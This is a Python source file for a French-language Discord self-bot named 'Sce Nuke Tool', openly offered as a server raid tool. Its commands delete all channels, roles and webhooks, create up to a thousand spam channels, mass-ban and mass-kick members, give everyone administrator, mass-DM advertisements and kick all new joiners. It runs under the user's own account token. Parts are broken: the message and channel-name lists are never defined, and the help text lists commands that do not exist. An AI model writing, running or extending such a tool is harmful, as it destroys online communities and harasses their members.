import subprocess
import discord
from discord.ext import commands, tasks
import random
import time
import asyncio
import requests

def install(package):
    subprocess.check_call(["pip", "install", package])

try:
    import discord
except ImportError:
    install("discord.py")

title = "[Sce Nuke Tool] (beta !!)"
options = [
    "Nuke",
    "Spam-role",
    "Spam-webhooks",
    "Spam-dm",
    "Spam",
    "delete-role",
    "delete-channel",
    "delete-webhooks",
    "Renameall",
    "Adminall",
    "Banall",
    "Kickall",
    "copy-user [in developpement]"
]

discord_option = "https://discord.gg/924ycm7jr6"

status = ["Sce Team"]

anti_join_enabled = False

token = input("Entrez votre token Discord : ")

client = commands.Bot(command_prefix="*", self_bot=True, help_command=None)


@tasks.loop(seconds=6)
async def change_presence():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=random.choice(status), url="https://www.twitch.tv/v"))

@client.event
async def on_error(event, *args, **kwargs):
    print('---------------------')
    print(f'Erreur sur l\'événement : {event}')
    print(f'Erreur : {args[0]}')
    print('---------------------/////')

@client.event
async def on_member_join(member):
    global anti_join_enabled
    if anti_join_enabled:
        if member.bot:
            if member.guild.me.guild_permissions.kick_members:
                await member.kick(reason="Anti join: Les nouveaux membres ne sont pas autorisés sur ce serveur !!.")
                print(f"\033[93mLe bot {member.name} a été kick pour avoir tenté de rejoindre le serveur.\033[0m")
            else:
                print("\033[91m[Erreur]\033[0m Je n'ai pas assez de permission pour kick les autres bots du serveur.")
        else:
            await member.kick(reason="Anti join: Les nouveaux membres ne sont pas autorisés sur ce serveur.")
            print(f"\033[93mLe membre {member.name} a été kick pour avoir essayé de rejoindre le serveur anti join !!.\033[0m")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f"\033[91m[Erreur]\033[0m Commande introuvable. Utilisez \033[94m*raid\033[0m pour obtenir la liste des commandes disponibles.")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"\033[91m[Erreur]\033[0m Argument manquant. Veuillez fournir tous les arguments requis pour exécuter cette commande.")
    elif isinstance(error, commands.CommandInvokeError):
        print(f"\033[91m[Erreur]\033[0m Une erreur est survenue lors de l'exécution de la commande.")
    elif isinstance(error, commands.BotMissingPermissions):
        print(f"\033[91m[Erreur]\033[0m Je n'ai pas les autorisations nécessaires pour exécuter cette commande.")
    elif isinstance(error, commands.MissingPermissions):
        print(f"\033[91m[Erreur]\033[0m Vous n'avez pas les autorisations nécessaires pour exécuter cette commande.")
    else:
        print(f"\033[91m[Erreur]\033[0m Une erreur est survenue lors de l'exécution de la commande.")
        print(f"Une erreur s'est produite : {error}")

@client.event
async def on_ready():
    print("Sce Team Selfbot is Online")
    
    
@client.command(name='raid')
async def raid(ctx):
    panel_message = await ctx.send(
        "$$ __**Sce Nuke Tool - Raid**__ $$\n"
        ".nuke -> delete all channel !! + spam channel \n"
        ".spam-role -> spam role avec des noms aléatoires \n"
        ".spam-webhooks -> Spamme des msg avec des webhooks de tous les salons \n"
        ".spamdm -> Envoie des messages directs à tous les membres du serveur (vous pourriez faire votre pub !) \n"
        ".spam -> Spamme des messages dans tous les canaux textuels du serveur \n"
        ".delete-role -> Supprime tous les rôles (sauf le rôle par défaut !) \n"
        ".delete-channel -> Supprime tous les salons du serveur ! \n"
        ".delete-webhooks -> Supprime tous les webhooks du serveur \n"
        ".adminall -> Créer un rôle avec les perms Admin et le donne à tous les membres du serveur !! \n"
        ".banall -> Bannir all member du serveur sauf le dev du serv et le bot \n"
        ".renameall -> Renomme all member du serveur \n"
        ".kickall -> Expulse tous les membres (sauf le dev du serveur) \n"
        ".anti-join -> Plus personne peut rejoindre le serveur (beta) \n"
        "SCE TEAM ON TOP \n"
    )
    await ctx.message.delete()
    await asyncio.sleep(15)
    await panel_message.delete()


@client.command(name='nuke')
async def create_and_delete_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Erreur lors de la suppression du salon {channel.name}: {e}")

    async def create_channel_and_spam(channel_name):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
        await asyncio.sleep(1)

    tasks = [create_channel_and_spam(f'{random.choice(channel_names)}-{i}') for i in range(1000)]
    await asyncio.gather(*tasks)

    try:
        await ctx.guild.edit(name="server")
    except Exception as e:
        print(f"Erreur lors de la modification du nom.: {e}")

    try:
        url = 'https://cdn.discordapp.com/avatars/1242188826877890620/665296b9eac933c22043c42bf46981fb?size=256.png'
        async with client.session.get(url) as resp:
            if resp.status != 200:
                raise Exception("Failed to download image")
            data = await resp.read()
            await ctx.guild.edit(icon=data)
    except Exception as e:
        print(f"Erreur lors de la modification de l'icône: {e}")


@client.command(name='adminall')
@commands.has_permissions(administrator=True)
async def give_admin(ctx):
    admin_role_name = "ADMIN"
    admin_role = discord.utils.get(ctx.guild.roles, name=admin_role_name)

    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
        except Exception as e:
            await ctx.send(f"Erreur lors de la création du rôle {admin_role_name}: {e}")
            return

    for member in ctx.guild.members:
        try:
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
        except Exception as e:
            print(f"Erreur lors de l'ajout du rôle {admin_role_name} à {member.name}: {e}")

    await ctx.send(f"Le rôle {admin_role_name} a été ajouté à tous les membres du serveur.")


@client.command(name='banall')
async def ban_all(ctx):
    if not ctx.guild.me.guild_permissions.ban_members:
        await ctx.send("Je n'ai pas la permission de bannir des membres.")
        return

    members_to_ban = [member for member in ctx.guild.members if member.id != ctx.author.id]

    for member in members_to_ban:
        try:
            await member.ban(reason="Banni par commande banall.")
        except discord.Forbidden:
            print(f"Le bot n'a pas la permission de bannir le membre {member.name}.")
        except discord.HTTPException as e:
            print(f"Erreur HTTP lors du bannissement du membre {member.name}: {e}")
        except Exception as e:
            print(f"Erreur lors du bannissement du membre {member.name}: {e}")

    await ctx.send("Tous les membres ont été bannis.")


@client.command(name='kickall')
async def kick_all(ctx):
    if not ctx.guild.me.guild_permissions.kick_members:
        await ctx.send("Je n'ai pas la permission de kicker des membres.")
        return

    members_to_kick = [member for member in ctx.guild.members if member.id != ctx.author.id]

    for member in members_to_kick:
        try:
            await member.kick(reason="Expulsé par commande kickall.")
        except discord.Forbidden:
            print(f"Le bot n'a pas la permission d'expulser le membre {member.name}.")
        except discord.HTTPException as e:
            print(f"Erreur HTTP lors de l'expulsion du membre {member.name}: {e}")
        except Exception as e:
            print(f"Erreur lors de l'expulsion du membre {member.name}: {e}")

    await ctx.send("Tous les membres ont été expulsés.")


@client.command(name='renameall')
async def rename_all(ctx, *, name):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
        except Exception as e:
            print(f"Erreur lors de la modification du nom du membre {member.name}: {e}")


@client.command(name='delete-webhooks')
async def delete_webhooks(ctx):
    for channel in ctx.guild.channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
        except Exception as e:
            print(f"Erreur lors de la suppression du webhook {webhook.name}: {e}")


@client.command(name='delete-channel')
async def delete_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Erreur lors de la suppression du salon {channel.name}: {e}")


@client.command(name='delete-role')
async def delete_roles(ctx):
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"Erreur lors de la suppression du rôle {role.name}: {e}")


@client.command(name='spam-role')
async def create_roles(ctx):
    for _ in range(100):
        try:
            await ctx.guild.create_role(name=random.choice(message_options))
        except Exception as e:
            print(f"Erreur lors de la création du rôle : {e}")


@client.command(name='spam-webhooks')
async def create_webhooks(ctx):
    for _ in range(100):
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name=random.choice(message_options))
            except Exception as e:
                print(f"Erreur lors de la création du webhook dans le salon {channel.name}: {e}")


@client.command(name='spamdm')
async def spam_dm(ctx, *, message):
    if not message:
        await ctx.send("Vous devez spécifier un message à envoyer.")
        return

    for member in ctx.guild.members:
        try:
            await member.send(message)
        except Exception as e:
            print(f"Erreur lors de l'envoi du message à {member.name}: {e}")


@client.command(name='anti-join')
async def toggle_anti_join(ctx):
    global anti_join_enabled
    anti_join_enabled = not anti_join_enabled
    print(f"Mode anti-join {'activé' if anti_join_enabled else 'désactivé'} par {ctx.author.name}")


@client.command(name='help')
async def help(ctx):
    embed = discord.Embed(title="Commandes Disponibles", description="Liste des commandes du bot", color=0x00ff00)
    embed.add_field(name=".raid", value="Affiche le panel de raid", inline=False)
    embed.add_field(name=".nuke", value="Supprime tous les canaux et spamme des nouveaux", inline=False)
    embed.add_field(name=".adminall", value="Donne les permissions administratives à tous les membres", inline=False)
    embed.add_field(name=".banall", value="Bannit tous les membres", inline=False)
    embed.add_field(name=".kickall", value="Expulse tous les membres", inline=False)
    embed.add_field(name=".renameall [nom]", value="Renomme tous les membres", inline=False)
    embed.add_field(name=".delete-webhooks", value="Supprime tous les webhooks", inline=False)
    embed.add_field(name=".delete-channel", value="Supprime tous les canaux", inline=False)
    embed.add_field(name=".delete-role", value="Supprime tous les rôles", inline=False)
    embed.add_field(name=".spam-role", value="Crée des rôles en boucle", inline=False)
    embed.add_field(name=".spam-webhooks", value="Spamme des messages via les webhooks", inline=False)
    embed.add_field(name=".spamdm [message]", value="Envoie des messages directs à tous les membres", inline=False)
    embed.add_field(name=".anti-join", value="Empêche les nouveaux membres de rejoindre", inline=False)
    embed.add_field(name=".deletecommand [commande]", value="Supprime un message de commande spécifique", inline=False)
    embed.add_field(name=".lookup_ip [ip_address]", value="Recherche des informations sur une IP", inline=False)
    embed.add_field(name=".copyuserid [id]", value="Copie les informations de l'utilisateur avec l'ID spécifié", inline=False)

    help_message = await ctx.send(embed=embed)
    
    await asyncio.sleep(15)
    try:
        await help_message.delete()
    except discord.Forbidden:
        print("Le bot n'a pas la permission de supprimer ce message.")
        
client.run(token)

# sce team on top
